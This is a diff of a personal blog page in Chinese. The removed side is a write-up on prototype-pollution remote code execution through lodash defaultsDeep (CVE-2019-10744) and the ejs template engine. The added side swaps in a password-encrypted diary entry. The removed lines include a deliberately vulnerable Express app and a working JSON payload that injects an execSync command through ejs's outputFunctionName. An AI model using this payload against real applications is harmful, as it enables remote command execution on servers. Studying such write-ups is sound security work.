@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="images/favicon.ico">
-  <title>Express+lodash+ejs原型链污染RCE | fmyyy</title>
+  <title>随便写写的日记 | fmyyy</title>
   <meta name="author" content="fmyyy" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -15,16 +15,16 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="Express+lodash+ejs原型链污染RCElodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）2019 年 7 月 2 日，Snyk 发布了一个高严重性原型污染安全漏洞（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。 Lodash 库中的 defaultsDeep 函数可能会被包含 constructor">
+  <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Express+lodash+ejs原型链污染RCE">
-<meta property="og:url" content="https://fmyyy.gitee.io/2022/02/17/loadsh+ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:title" content="随便写写的日记">
+<meta property="og:url" content="https://fmyyy.gitee.io/2022/05/04/diary/index.html">
 <meta property="og:site_name" content="fmyyy">
-<meta property="og:description" content="Express+lodash+ejs原型链污染RCElodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）2019 年 7 月 2 日，Snyk 发布了一个高严重性原型污染安全漏洞（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。 Lodash 库中的 defaultsDeep 函数可能会被包含 constructor">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
-<meta property="article:published_time" content="2022-02-17T01:14:04.000Z">
-<meta property="article:modified_time" content="2022-02-17T02:24:20.000Z">
+<meta property="article:published_time" content="2022-05-04T01:14:04.000Z">
+<meta property="article:modified_time" content="2022-05-04T15:06:33.629Z">
 <meta property="article:author" content="fmyyy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
@@ -171,17 +171,17 @@
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">Express+lodash+ejs原型链污染RCE</h1>
+                <h1 class="kratos-entry-title text-center">随便写写的日记</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2022-02-17</li>
+                <li><i class="fa fa-calendar"></i> 2022-05-04</li>
                 <li><i class="fa fa-user"></i> 作者 fmyyy</li>
                 <li>
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~1.95K
+                        1330
                     
                     字
                 </li>
@@ -190,33 +190,22 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1645064660000"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1651676793629"></time> 前，其中的内容可能需要更新。
             </div>
             
-                <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Express-lodash-ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93RCE"><span class="toc-number">1.</span> <span class="toc-text">Express+lodash+ejs原型链污染RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lodash-defaultsDeep-%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88CVE-2019-10744%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">lodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE-gt-RCE"><span class="toc-number">1.2.</span> <span class="toc-text">原型链-&gt;RCE</span></a></li></ol></li></ol>
-                </div>
-            
             <hr />
-            <h1 id="Express-lodash-ejs原型链污染RCE"><a href="#Express-lodash-ejs原型链污染RCE" class="headerlink" title="Express+lodash+ejs原型链污染RCE"></a>Express+lodash+ejs原型链污染RCE</h1><h2 id="lodash-defaultsDeep-方法造成的原型链污染（CVE-2019-10744）"><a href="#lodash-defaultsDeep-方法造成的原型链污染（CVE-2019-10744）" class="headerlink" title="lodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）"></a>lodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）</h2><p>2019 年 7 月 2 日，<a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-LODASH-450202">Snyk 发布了一个高严重性原型污染安全漏洞</a>（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。</p>
-<p>Lodash 库中的 <code>defaultsDeep</code> 函数可能会被包含 <code>constructor</code> 的 Payload 诱骗添加或修改<code>Object.prototype</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const mergeFn = require(&#x27;lodash&#x27;).defaultsDeep;</span><br><span class="line">const payload = &#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">function check() &#123;</span><br><span class="line">    mergeFn(&#123;&#125;, JSON.parse(payload));</span><br><span class="line">    console.log(Object.whoami)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img.le1a.com/2022/02/16/c615491126421.png" alt="1645014128315.png"></p>
-<p><img src="https://img.le1a.com/2022/02/16/20121b5ebc2fe.png" alt="1645014176125.png"></p>
-<h2 id="原型链-gt-RCE"><a href="#原型链-gt-RCE" class="headerlink" title="原型链-&gt;RCE"></a>原型链-&gt;RCE</h2><p>简单的应用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">const lodash = require(&#x27;lodash&#x27;);</span><br><span class="line">const ejs = require(&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())</span><br><span class="line"></span><br><span class="line">app.set(&#x27;views&#x27;, &#x27;./&#x27;);</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(&#x27;index&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    let data = &#123;&#125;;</span><br><span class="line">    let input = JSON.parse(req.body.content);</span><br><span class="line">    lodash.defaultsDeep(data, input);</span><br><span class="line">    res.json(&#123;message: &quot;OK&quot;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">let server = app.listen(8086, &#x27;0.0.0.0&#x27;, function() &#123;</span><br><span class="line">    console.log(&#x27;Listening on port %d&#x27;, server.address().port);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>断点res.render(‘index’);调试之后来到ejs库的compile函数</p>
-<p><img src="https://img.le1a.com/2022/02/17/a834519fdf620.png" alt="1645063124436.png"></p>
-<p>这里有个命令注入，outputFunctionName默认undefined，利用lodash.defaultsDeep污染outputFunctionName键，造成命令注入。</p>
-<p>payload</p>
-<p><code>&#123;&quot;type&quot;:&quot;constructor&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;open -a calculator&#39;);//&quot;&#125;&#125;&#125;&#125;</code></p>
-<p>污染之后</p>
-<p><img src="https://img.le1a.com/2022/02/17/18cd65bb89982.jpeg" alt="1645063990685.jpeg"></p>
-<p>post之后get访问/触发render</p>
-<p><img src="https://img.le1a.com/2022/02/17/2ae9a72df3d8d.png" alt="1645063432732.png"></p>
-
+            <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="58d7bdc3b09e095eb18a573f6fd59689a1435e50fb482e8f1031dff63514bc49">adda23cb817452ecdafc3f3f7d30fbb11dc9fe63279f201268436925f1012edffb2c918232ef5d0326517f7714793d4011d8fdfb6b9f194f9901daa3977f1c5a8c4e252c8c5fffe02dfaeceb808afadbc6dfd8cc9329250b58acf9b4ccfda52ad87f3d34112066309d89003e88c5314354a775139fa21db1c8b13dce69ea3d207db365cb8c6419dbaa139d44357dbd01ab39f5ec5bf4c2ef80cbdeeb0429a8971d1803e4c830b1c47acee79b372e8f615bf2c7b584398b4347c213297ecd8317ff054fb5ce98d5035634f6d4ccc4b9dab0fcac6facbe07ed66d19a78b87738232d3255f1c5da45688fb9a228a8016b06b7b967ed3c009356a70c47e47e8b22139fc68ea41d9a9d73410375b013be0d9335f3fd7e77fabaf93614f7e820eacd3ef461e938b5356a0cf8485a7ee81776e6ce718713bd1228ab501970d2334b7ff6c37a8ada6074424aadfb3eb29ad8e34936938c870c62462d31b397d08f2751ceac5293e18e2237bdb07549697cf6090df713fcdd279729cab41b04c544672ae360dc27e5bab0c56f1ff3211e172e55c0334d1c13672b5505fa51976d88f2a4893c52d41dc7360bfd65c9be041b8aa5367f6c74961eea430f20344c8cc5a082c3220943359f41467af49ffd01beea62c56b4083d92afe1ea2939f28f2a9ddacc329d316a92517662f95d50f32fab1ebd8e0d5f41ca03acbe9ba3530f9711231eed650eddbfa251fe0d638677754a75d1dc37530e0c8b4bb55c7a5d0e9aacfa982d201cad79f6d18506e6413da419520dd886c449b39e25b7ff8034a15b2dee4fff2b736497d6b399e74a68cccb384f2564cd448bafcb7bc71d17545794467898fa671e795269c0e80243d83654de4e25b</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
         </div>
         
             <div class="kratos-copyright text-center clearfix">
@@ -269,7 +258,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "https://fmyyy.gitee.io/2022/02/17/loadsh+ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
+                text: "https://fmyyy.gitee.io/2022/05/04/diary/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -281,9 +270,9 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "https://fmyyy.gitee.io/2022/02/17/loadsh+ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/";
-            const title         = "「Express+lodash+ejs原型链污染RCE」";
-            const excerpt       = `Express+lodash+ejs原型链污染RCElodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）2019 年 7 月 2 日，Snyk 发布了一个高严重性原型污染安全漏洞（CVE-201...`;
+            const hostUrl       = "https://fmyyy.gitee.io/2022/05/04/diary/";
+            const title         = "「随便写写的日记」";
+            const excerpt       = `Here's something encrypted, password is required to continue reading.`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -305,7 +294,7 @@
                     
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2022-02-17</span>
+                <span>最后编辑：2022-05-04</span>
                 </div>
             </div>
         </footer>
@@ -314,13 +303,9 @@
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" CVE-2022-21824-console.table原型链污染" href="/2022/02/16/CVE-2022-21824/">&lt; 上一篇</a>
+                <a title=" JEP290" href="/2022/05/03/jep290/">&lt; 上一篇</a>
             </div>
             
-            
-            <div class="nav-next clearfix">
-                <a title=" weblogic-CVE-2017-10271" href="/2022/02/21/weblogic-CVE-2017-10271/">下一篇 &gt;</a>
-            </div>
             
         </nav>
     
@@ -353,18 +338,6 @@
 </aside>
             
                     <div class="sticky-area">
-                
-                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
-    <div class="photo-background"></div>
-    <h4 class="widget-title no-after">
-        <i class="fa fa-compass"></i>
-        文章目录
-        <span class="toc-progress-bar"></span>
-    </h4>
-    <div class="textwidget">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Express-lodash-ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93RCE"><span class="toc-text">Express+lodash+ejs原型链污染RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lodash-defaultsDeep-%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88CVE-2019-10744%EF%BC%89"><span class="toc-text">lodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE-gt-RCE"><span class="toc-text">原型链-&gt;RCE</span></a></li></ol></li></ol>
-    </div>
-</aside>
                 
                     <div class="sticky-area">
                 
